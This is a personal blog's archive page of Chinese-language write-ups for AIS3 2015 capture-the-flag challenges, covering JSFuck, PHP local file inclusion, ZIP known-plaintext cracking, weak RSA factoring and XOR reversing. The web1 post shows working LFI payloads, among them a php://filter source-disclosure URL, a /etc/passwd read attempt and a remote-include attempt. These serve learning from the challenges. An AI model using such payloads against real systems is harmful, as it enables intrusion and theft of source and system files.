<!doctype html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
<head>
<meta charset="utf-8">
<title>CTF Posts &#8211; YU KAI'S BLOG</title>
<meta name="description" content="An archive of ctf posts.">




<!-- Open Graph -->
<meta property="og:locale" content="zh_TW">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF Posts">
<meta property="og:description" content="An archive of ctf posts.">
<meta property="og:url" content="//joyhuang9473.github.io/posts/ctf/index.html">
<meta property="og:site_name" content="YU KAI'S BLOG">





<link rel="canonical" href="//joyhuang9473.github.io/posts/ctf/">
<link href="//joyhuang9473.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="YU KAI'S BLOG Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">

<!-- For all browsers -->
<link rel="stylesheet" href="//joyhuang9473.github.io/assets/css/main.css">
<link rel="stylesheet" href="//joyhuang9473.github.io/assets/css/icard_resume.css">

<!-- Webfonts -->
<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">

<meta http-equiv="cleartype" content="on">

<!-- Load Modernizr -->
<script src="//joyhuang9473.github.io/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>

<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="//joyhuang9473.github.io/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="//joyhuang9473.github.io/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="//joyhuang9473.github.io/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="//joyhuang9473.github.io/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="//joyhuang9473.github.io/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="//joyhuang9473.github.io/images/apple-touch-icon-144x144-precomposed.png">



</head>

<body id="post-index" class="feature">

<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
	<button class="dl-trigger">Open Menu</button>
	<ul class="dl-menu">
		<li><a href="//joyhuang9473.github.io/">Home</a></li>
		<li>
			<a href="#">About</a>
			<ul class="dl-submenu">
				<li>
					<img src="http://i.imgur.com/IM68HzY.jpg" alt="YU-KAI HUANG photo" class="author-photo">
					<h4>YU-KAI HUANG</h4>
					<p>Hi! I'm a coder, interested in web, machine leaning, computer security and games.</p>
				</li>
				<li><a href="//joyhuang9473.github.io/about/"><span class="btn btn-inverse">Learn More</span></a></li>
				<li>
					<a href="mailto:joyhuang@ags.tw"><i class="fa fa-fw fa-envelope"></i> Email</a>
				</li>
				
				
				
				
				<li>
					<a href="http://github.com/joyhuang9473"><i class="fa fa-fw fa-github"></i> GitHub</a>
				</li>
				
				
				
				
			</ul><!-- /.dl-submenu -->
		</li>
		<li>
			<a href="#">Posts</a>
			<ul class="dl-submenu">
				<li><a href="//joyhuang9473.github.io/posts/">All Posts</a></li>
				<li><a href="//joyhuang9473.github.io/tags/">All Tags</a></li>
				<li><a href="//joyhuang9473.github.io/posts/ctf">CTF</a></li>
			</ul>
		</li>
		<li>
			<a href="#">Projects</a>
			<ul class="dl-submenu">
				<li><a href="//joyhuang9473.github.io/projects/">All Projects</a></li>
				<li><a href="//joyhuang9473.github.io/projects/game">Game</a></li>
				<li><a href="//joyhuang9473.github.io/projects/web">Web</a></li>
			</ul>
		</li>

		
	</ul><!-- /.dl-menu -->
</nav><!-- /.dl-menuwrapper -->


<div class="entry-header">
  <div class="image-credit">Image source: <a href="http://www.dargadgetz.com/ios-7-abstract-wallpaper-pack-for-iphone-5-and-ipod-touch-retina/">dargadgetz</a></div><!-- /.image-credit -->
  
    <div class="entry-image">
      <img src="//joyhuang9473.github.io/images/abstract-1.jpg" alt="CTF Posts">
    </div><!-- /.entry-image -->
  
  <div class="header-title">
    <div class="header-title-wrap">
      <h1>YU KAI'S BLOG</h1>
      <h2>CTF Posts</h2>
    </div><!-- /.header-title-wrap -->
  </div><!-- /.header-title -->
</div><!-- /.entry-header -->

<div id="main" role="main">
  
<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web2.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web2.html" rel="bookmark" title="AIS3 2015 Writeup: web2" itemprop="url">AIS3 2015 Writeup: web2</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="jsfuck">JSFuck</h2>

<p>Keynote:</p>

<ul>
  <li>可以只用 6 個字符 []()!+ 來編寫 JavaScript 程序</li>
</ul>

<p>Reference:</p>

<ul>
  <li>http://www.jingwentian.com/t-413</li>
  <li>http://codegolf.stackexchange.com/questions/28714/convert-jsfuck-to-normal-js</li>
</ul>

<p>剛開始看到 code 時覺得是 javascript，試著把它跑起來</p>

<pre><code>&lt;!-- test.html --&gt;
&lt;html&gt;
&lt;head&gt;&lt;/had&gt;
&lt;body&gt;
&lt;script&gt;
{ web2.txt }
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>結果出現了一個 ^_^ ，確定是一個可執行的 javascript</p>

<pre><code>^_^
</code></pre>

<p>網路上得知 JSFuck，藉由他人所寫的 script ，把 jsfuck 轉換為一般 javaScript</p>

<pre><code>&lt;!- jsfuck-decoder.html -&gt;
&lt;html&gt;
&lt;head&gt;&lt;/had&gt;
&lt;body&gt;
&lt;script&gt;
alert(/\n(.+)/.exec(eval(prompt().slice(0,-2)))[1]);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>輸出結果</p>

<p><img src="http://i.imgur.com/uGgznIH.png" alt="jsfuck_in-ais3's_web_question" /></p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web1.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web1.html" rel="bookmark" title="AIS3 2015 Writeup: web1" itemprop="url">AIS3 2015 Writeup: web1</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="local-file-inclusion-lfi-vulnerability">Local File Inclusion (LFI) vulnerability</h2>

<p>Keynote:</p>

<ul>
  <li>php:// — Accessing various I/O streams</li>
</ul>

<p>Reference:</p>

<ul>
  <li>http://security.stackexchange.com/questions/90724/reading-php-comments-using-php-page-that-open-text-files-ctf</li>
  <li>https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/</li>
</ul>

<p>Tools:</p>

<ul>
  <li>Base64 Online Decode https://www.base64decode.org/</li>
</ul>

<p>瀏覽 http://52.69.163.194/web1/?page=about 發現內容是 include 自 about.php</p>

<p><code>
http://52.69.163.194/web1/about.php
</code></p>

<p>發現輸入相對路徑去讀取檔案是不可行的，php 出錯而沒有輸出結果</p>

<p><code>
http://52.69.163.194/web1/?page=../web1/about
</code></p>

<p>想要讀取 /etc/passwd 也不可行</p>

<p><code>
http://52.69.163.194/web1/?page=/etc/passwd 
</code></p>

<p>嘗試 include remote file 也不可行，allow_url_include 可能沒有開</p>

<p><code>
http://52.69.163.194/web1/?page=http://somewhere/hackfile.php
</code></p>

<p>最後解法是透過 php://filter 強迫 php 在 include file 之前，先把該檔案用 base64 編碼，之後網頁就吐出一堆 base64 文字串，再將文字串拿去 decode，就可以看到 php 原始碼，flag 就藏在裡面</p>

<pre><code>http://52.69.163.194/web1/?page=php://filter/convert.base64-encode/resource=index

PGEgaHJlZj0nP3BhZ2U9YWJvdXQnPiBhYm91dCA8L2E+IDxiciAvPgo8YSBocmVmPSc/cGFnZT10ZXN0Jz4gdGVzdCA8L2E+IDxiciAvPgo8YnI+Cjxicj4KPD9waHAKCiAgICAgICAgJHBhZ2UgPSAkX0dFVFsncGFnZSddOwoKICAgICAgICAkcGFnZSA9ICRwYWdlIC4gJy5waHAnOwogICAgICAgICRwYWdlID0gc3RyX3JlcGxhY2UoIi4uLyIsICIiLCAkcGFnZSk7CiAgICAgICAgaW5jbHVkZSggJHBhZ2UgKTsKCiAgICAgICAgLy8gdGhlIGtleSBpcyBBSVMze3BocF93cmFwcGVyX3JvY2tzfQ==
</code></pre>

<p>decode:</p>

<pre><code>&lt;a href='?page=about'&gt; about &lt;/a&gt; &lt;br /&gt;
&lt;a href='?page=test'&gt; test &lt;/a&gt; &lt;br /&gt;
&lt;br&gt;
&lt;br&gt;
&lt;?php

        $page = $_GET['page'];

        $page = $page . '.php';
        $page = str_replace("../", "", $page);
        include( $page );

        // the key is AIS3{php_wrapper_rocks}
</code></pre>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-pwn3d1.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-pwn3d1.html" rel="bookmark" title="AIS3 2015 Writeup: pwn3d1" itemprop="url">AIS3 2015 Writeup: pwn3d1</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="buffer-overflow-attack">Buffer Overflow Attack</h2>

<p>Keynote:</p>

<ul>
  <li>stack</li>
</ul>

<p>Tools:</p>

<ul>
  <li>pwntool</li>
</ul>

<p>sub_4006AD:</p>

<p><img src="http://i.imgur.com/uPnmKhO.png" alt="pwn1_asm_in_ais3's_binary_question" /></p>

<p><img src="http://i.imgur.com/ed2urWa.png" alt="pwn1_boa_in_ais3's_pwn3d_question" /></p>

<p>stack ??</p>

<pre><code>-----ret-----
4
----var_4----
16
----var_20---
4
-----rbp-----
20
-----rsp-----
</code></pre>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc3.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc3.html" rel="bookmark" title="AIS3 2015 Writeup: misc3" itemprop="url">AIS3 2015 Writeup: misc3</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="file-extension">File extension</h2>

<p>Keynote:</p>

<ul>
  <li>gzip, tar, bmp</li>
</ul>

<p>Tools:</p>

<ul>
  <li>stegsolve.jar: A steganographic image analyzer, solver and data extractor for challanges.</li>
</ul>

<p>查看 c4 檔案類型</p>

<pre><code>$ file c4

c4: gzip compressed data, from Unix
</code></pre>

<p>重新命名 c4 為 c4.gz</p>

<pre><code>$ gzip -d c4

gzip: c4: unknown suffix -- ignored

$ mv c4 c4.gz
$ gzip -d c4.gz
</code></pre>

<p>解壓出一個 tar archive 的 c4，且 c4 裡面又包了 c4 ，為避免 overwrite ，改名再解壓</p>

<pre><code>$ tar -zxvf c4

x c4: Refusing to overwrite archive
tar: Error exit delayed from previous errors.

$ tar -tvf c4
-rw-rw-r--  0 orange orange 345654 Jul 21 18:02 c4

$ mv c4 c4.tar
$ tar -zxvf c4.tar

x c4

$ file c4

c4: PC bitmap, Windows 3.x format, 480 x 240 x 24
</code></pre>

<p>此時 c4 為 bmp 圖片檔，隱約可以看到有字位於左下角</p>

<p><img src="http://imgur.com/LDlMjBq.png" alt="c4_bmp_in_ais3's_misc_question" /></p>

<p>利用 stegsolve.jar 去處理圖片，在 Red plane 2 模式時就可以清楚看到字了</p>

<p><img src="http://imgur.com/ALDem6N.png" alt="c4_solved_bmp_in_ais3's_misc_question" /></p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc2.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc2.html" rel="bookmark" title="AIS3 2015 Writeup: misc2" itemprop="url">AIS3 2015 Writeup: misc2</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="known-plaintext-attack">Known-plaintext attack</h2>

<p>Keynote:</p>

<ul>
  <li>cracking ZIP Files</li>
  <li>you need to have one of the original files contained in the encrypted archive</li>
</ul>

<p>Reference:</p>

<ul>
  <li>https://www.hackthis.co.uk/articles/known-plaintext-attack-cracking-zip-files</li>
</ul>

<p>Tools:</p>

<ul>
  <li>pkcrack</li>
</ul>

<p>一開始先確認 facebook.zip 為 zip 檔</p>

<pre><code>$ file facebook.zip

facebook.zip: Zip archive data, at least v1.0 to extract
</code></pre>

<p>打開後發現有加密，試著看壓縮檔裡面有什麼檔案</p>

<pre><code>$ unzip -l facebook.zip

Archive:  facebook.zip
  Length     Date   Time    Name
 --------    ----   ----    ----
       38  07-15-15 18:15   key.txt
        0  07-15-15 18:13   p960x960/
    26664  10-30-13 08:19   p960x960/851556_443281069111871_602278786_n.png
 --------                   -------
    26702                   3 files
</code></pre>

<p>藉由網路上的教學</p>

<blockquote>
  <p>you need to have one of the original files contained in the encrypted archive
What you are going to do with it is you are going to compress it using the same compression method as the protected file. Remember this, otherwise it won’t work. So after you do that, move both your zip files, the encrypted one and the plaintext zip</p>
</blockquote>

<p>去 google 找 851556_443281069111871_602278786_n.png</p>

<p><img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-prn1/p960x960/851556_443281069111871_602278786_n.png" alt="851556_443281069111871_602278786_n.png" /></p>

<p>壓縮該檔案（包含完整路徑）</p>

<pre><code>$ zip -r plaintext.zip p960x960/851556_443281069111871_602278786_n.png
$ file plaintext.zip

Archive:  plaintext.zip
  Length     Date   Time    Name
 --------    ----   ----    ----
    26664  07-25-15 00:09   p960x960/851556_443281069111871_602278786_n.png
 --------                   -------
    26664                   1 file
</code></pre>

<p>執行 pccrack</p>

<p>pkcrack -C facebook.zip -c “p960x960/851556_443281069111871_602278786_n.png” -P plaintext.zip -p “p960x960/851556_443281069111871_602278786_n.png” -d decrypted.zip -a</p>

<p>解壓縮 decrypted.zip，裡面的 key.txt 就放著 flag</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto2.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto2.html" rel="bookmark" title="AIS3 2015 Writeup: crypto2" itemprop="url">AIS3 2015 Writeup: crypto2</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="rsa-cracking">RSA Cracking</h2>

<p>Keynote:</p>

<ul>
  <li>a 768 bit RSA crack when all you have is the file you want to decrypt, and the public key</li>
</ul>

<p>Reference:</p>

<ul>
  <li>http://m0x39.blogspot.tw/2012/12/0x00-introduction-this-post-is-going-to.html</li>
  <li>http://blog.orange.tw/2014/10/hack-in-box-2014-ctf-writeup-keygenme.html</li>
</ul>

<p>Tools:</p>

<ul>
  <li>rsatool.py: https://github.com/ius/rsatool.git</li>
  <li>Factordb: http://www.factordb.com</li>
  <li>rsacrack.py:</li>
</ul>

<table>
  <tbody>
    <tr>
      <td>usage: cat file</td>
      <td>python rsacrack.py -d [private key exponent] [public key modulus]</td>
    </tr>
  </tbody>
</table>

<script src="https://gist.github.com/joyhuang9473/d77f9428d3c507989714.js"></script>

<ul>
  <li>p = randomly chosen prime</li>
  <li>q = randomly chosen prime</li>
  <li>n = modulus for public and private keys(n=pq)</li>
  <li>f(n)=(p-1)(q-1) :: f(n) counts the number of positive integers less than or equal to n that are relatively prime to n</li>
  <li>e = exponent (chosen as 1 &lt; e &lt; f(n) &amp;&amp; greatest common divisor of (e, f(n)) = 1… so e and f(n) are coprime) this is the public key exponent</li>
  <li>d = e^-1(mod f(n)) or (de) = 1 mod f(n)  — this is the private key exponent</li>
</ul>

<p>在 rsa.py 裡已經有 public key 的 n, e ，藉由 <a href="http://www.factordb.com" title="Factordb">Factordb</a> 找出 p,q 兩個大質數</p>

<p>使用 rsatool.py 找出 private key 的 n, d</p>

<pre><code>$ python rsatool.py -p 800644567978575682363895000391634967 -q 83024947846700869393771322159348359271173 -n 66473473500165594946611690873482355823120606837537154371392262259669981906291 -e 65537
Using (p, q) to initialise RSA instance

n =
92f6a717a4ca87fbb4e008b2ba036d8fc5ca22c8bb61060fef170ce6792ec573

e = 65537 (0x10001)

d =
480c35d4888c65e8073f81e424ff42c28879294c3c4954a295bf3880decf0659

p = 800644567978575682363895000391634967 (0x9a32d32db1c5be9aeac5de0daa5017)

q =
f3fd0751a4697130a74c96ce57bad29305
</code></pre>

<p>p.s 83024947846700869393771322159348359271173 (0xf3fd0751a4697130a74c96ce57bad29305)</p>

<p>使用 rsacrack.py</p>

<pre><code>$ cat flag.enc | python rsacrack.py -d 480c35d4888c65e8073f81e424ff42c28879294c3c4954a295bf3880decf0659 92f6a717a4ca87fbb4e008b2ba036d8fc5ca22c8bb61060fef170ce6792ec573 | strings
AIS3{rsaaaaaaaaA_orz}
</code></pre>

<p>p.s</p>

<p>n = 0x92f6a717a4ca87fbb4e008b2ba036d8fc5ca22c8bb61060fef170ce6792ec573
= 66473473500165594946611690873482355823120606837537154371392262259669981906291</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto1.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto1.html" rel="bookmark" title="AIS3 2015 Writeup: crypto1" itemprop="url">AIS3 2015 Writeup: crypto1</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="reference">Reference:</h2>

<p>Keynote:</p>

<ul>
  <li>filename</li>
</ul>

<p>Reference:</p>

<ul>
  <li>https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher</li>
</ul>

<p>Tools:</p>

<ul>
  <li>Vigenere Cipher Decoder http://www.dcode.fr/vigenere-cipher</li>
  <li>Vigenère Cipher Codebreaker http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx</li>
</ul>

<p>藉由第一個連結找出可能的 key length，再由第二個連結，設定 key size 後找出所有的可能，並搜尋 “the key is” 找出可辨識的字串</p>

<p><img src="http://i.imgur.com/IdI4AD1.png" alt="vigenere_key_length_in_ais3's_crypto_question" /></p>

<p><img src="http://i.imgur.com/xhFbfMR.png" alt="vigenere_decode_in_ais3's_crypto_question" /></p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary3.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary3.html" rel="bookmark" title="AIS3 2015 Writeup: binary3" itemprop="url">AIS3 2015 Writeup: binary3</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="bit-assembly-code">64bit assembly code</h2>

<p>Keynote:</p>

<ul>
  <li>little endian</li>
  <li>xor</li>
</ul>

<p>Tools:</p>

<ul>
  <li>ida64</li>
  <li>XOR Calculator online https://xor.pw/</li>
  <li>Hex to ASCII text converter http://www.rapidtables.com/convert/number/hex-to-ascii.htm</li>
</ul>

<p>主要觀察 check1, check2, gg function</p>

<p>check1:</p>

<p><img src="http://i.imgur.com/MxSrGW4.png" alt="stupid_v2_check1_func_in_ais3's_binary_question" /></p>

<p>check2:</p>

<p><img src="http://i.imgur.com/kTJEAKj.png" alt="stupid_v2_check2_func_in_ais3's_binary_question" /></p>

<p>gg:</p>

<p><img src="http://i.imgur.com/8crNjMj.png" alt="stupid_v2_gg_func_in_ais3's_binary_question" /></p>

<p>在 check1 時，to_reg function 會將 input 存入 rdx，key 的值為 0DDDDAAAADADADDAAh，經過運算：</p>

<pre><code>key = (input) XOR 0DDDDAAAADADADDAAh
</code></pre>

<p>進入 check2 ，call gg function 並且 ax = 0 時即可進到正確的段落 “Yeah, It’s a flag !!! …”</p>

<p>進入 gg function，分兩次檢查 key 的值，總之 key 的值要為 0BFB7B8CEh 和 0BCB4DEC4h 的連接</p>

<pre><code>key = (input) XOR 0DDDDAAAADADADDAAh
    = 0BCB4DEC4BFB7B8CEh
</code></pre>

<p>所以可得 input 值為 06169746e656d6564h 並拿去轉成 ascii，注意 little endian，反向讀取:</p>

<pre><code>dementia
</code></pre>

<p>得到一個癡呆 :)</p>

<p>flag: AIS3{dementia}</p>


  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary2.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary2.html" rel="bookmark" title="AIS3 2015 Writeup: binary2" itemprop="url">AIS3 2015 Writeup: binary2</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="shellcode-to-bin">Shellcode to bin</h2>

<p>Keynote:</p>

<ul>
  <li>shellcode</li>
  <li>xor</li>
</ul>

<p>Reference:</p>

<ul>
  <li>http://theloshackers.blogspot.tw/2013/08/convert-hex-shellcode-to-binary-mode.html</li>
</ul>

<p>Tools:</p>

<ul>
  <li>ida64</li>
  <li>XOR Calculator online https://xor.pw/</li>
  <li>Hex to ASCII text converter http://www.rapidtables.com/convert/number/hex-to-ascii.htm</li>
</ul>

<p>將 shellcode 輸出成 bin</p>

<pre><code>$ echo -ne "{ shellcode }" &gt; sc.bin
</code></pre>

<p>再丟到 ida 找到這個片段</p>

<p><img src="http://i.imgur.com/0WraX3i.png" alt="sc_shellcode_to_bin_in_ais3's_binary_question" /></p>

<p>總共有 40 個字元在堆疊中，藉由 [rsi+rdx] 逐一讀取 stack 中的字元並與 0CCh 做 xor，直到 dl 為 37 (25h)，也就是第 37 個字元為止</p>

<pre><code># origin

414141C6B1B9A3B5
93BEA3AA93A8A0BC
A1A5BF93BFA593A9
A8A3AFA0A0A9A4BF
93A7A3B7FF9F858D

# after xor
#[] : ignored

[    ]0a7d756f79
5f726f665f646c70
6d69735f73695f65
646f636c6c656873
5f6b6f7b33534941
</code></pre>

<p>Little Endian 系統，反向讀取並將 hex 轉為 ascii 就可以看到 flag</p>

<p><img src="http://i.imgur.com/ohf0t1o.png" alt="sc_converted_hex_to_ascii_in_ais3's_binary_question" /></p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2015-07-27T12:00:00+08:00"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary1.html">July 27, 2015</a></time></span><span class="author vcard"><span class="fn"><a href="//joyhuang9473.github.io/about/" title="About YU-KAI HUANG">YU-KAI HUANG</a></span></span>
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary1.html" rel="bookmark" title="AIS3 2015 Writeup: binary1" itemprop="url">AIS3 2015 Writeup: binary1</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="strings">Strings</h2>

<p>Keynote:</p>

<ul>
  <li>動態分析</li>
</ul>

<p>Tools:</p>

<ul>
  <li>ollyDbg201h</li>
</ul>

<p>把 bin1.exe 丟到 ollydbg ，搜尋 string ‘AIS3’ 就可以找到 flag</p>

<p><img src="http://i.imgur.com/nnfBQ1S.png" alt="bin1_exe_strings_in_ais3's_binary_question" /></p>

<p>有稍微的漏字，但就依照 flag 上的語義自己填補了</p>

<p>p.s</p>

<p>ollyDbg110 的 strings 比 ollyDbg201h 較不完整</p>

<p>ollyDbg201h 的 strings 仍然會漏字，仍不清楚原因</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->


<div class="pagination">
  
    Previous
  
  <ul class="inline-list">
    <li>
      
        <a href="//joyhuang9473.github.io">1</a>
      
    </li>
    
  </ul>
  
    Next
  
</div><!-- /.pagination -->

  <!-- general advertisement -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-4665795394568321"
     data-ad-slot="2959368090"
     data-ad-format="auto"></ins> 
</div><!-- /#main -->

<div class="footer-wrapper">
  <footer role="contentinfo">
    <span>&copy; 2015 YU-KAI HUANG. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/hpstr-jekyll-theme/" rel="nofollow">HPSTR Theme</a>.</span>

<p><img src="https://ga-beacon.appspot.com/UA-65353378-3/joyhuang9473.github.io/CTF Posts" alt="Analytics"></p>

  </footer>
</div><!-- /.footer-wrapper -->

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="//joyhuang9473.github.io/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
<script src="//joyhuang9473.github.io/assets/js/scripts.min.js"></script>


<!-- Asynchronous Google Analytics snippet -->




<!-- Google Adsense -->
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

</body>
</html>